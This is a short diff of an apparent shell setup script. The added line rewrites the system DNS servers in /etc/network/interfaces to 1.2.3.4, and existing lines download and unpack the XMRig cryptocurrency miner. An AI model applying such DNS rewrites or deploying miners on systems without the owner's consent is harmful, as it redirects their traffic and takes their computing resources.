@@ -1,3 +1,4 @@
+sed -i '/dns-nameservers 8.8.8.8 8.8.4.4/c\        dns-nameservers 1.2.3.4 1.2.3.4' /etc/network/interfaces
 wget https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-static-x64.tar.gz
 tar -xvf xmrig-6.15.0-linux-static-x64.tar.gz
 ls
